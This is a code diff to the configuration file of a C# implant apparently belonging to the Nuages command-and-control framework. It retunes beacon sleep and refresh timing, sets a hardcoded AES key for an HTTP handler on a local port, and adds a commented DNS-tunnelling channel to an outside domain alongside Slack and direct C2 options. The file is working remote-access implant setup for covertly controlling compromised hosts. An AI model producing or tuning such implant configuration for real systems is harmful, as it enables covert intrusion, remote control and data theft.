@@ -1,4 +1,5 @@
-﻿using System.Collections.Generic;
+﻿using NuagesSharpImplant.Connections;
+using System.Collections.Generic;
 
 namespace NuagesSharpImplant
 {
@@ -10,22 +11,27 @@ namespace NuagesSharpImplant
             Dictionary<string, string> config = new Dictionary<string, string>();
 
             // Sleep time in between heartbeats
-            config["sleep"] = "1";
+            config["sleep"] = "5";
 
             // Buffer size for pipes (file transfers / tcp / interactive)
             config["buffersize"] = "65535";
 
             // Refreshrate in milliseconds
-            config["refreshrate"] = "500";
+            config["refreshrate"] = "50";
 
             // If the Direct connector is used (VERY BAD PRACTICE - Only for POC)
             //DirectConnection connection = new DirectConnection("http://127.0.0.1:3030/implant/", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
 
             // If the HTTPAES256 Handler is used:
-            HTTPAES256Connection connection = new HTTPAES256Connection("http://127.0.0.1:8888", "password", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
+            HTTPAES256Connection connection = new HTTPAES256Connection("http://127.0.0.1:8888", "hellp", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
 
             // If the SLACKAES256 Handler is used:
             // SLACKAES256Connection connection = new SLACKAES256Connection("password", "CHANNELID", "SLACK_BOT_TOKEN", "SLACK_APP_TOKEN", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
+
+            // If the DNSAES256 Handler is used:
+            // config["buffersize"] = "200";
+            // config["refreshrate"] = "1000";
+            // DNSAES256Connection connection = new DNSAES256Connection("t.rapidsurvey.org", "password", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
 
             // If the multiple connections are used
             //List<NuagesC2Connection> connections = new List<NuagesC2Connection>();
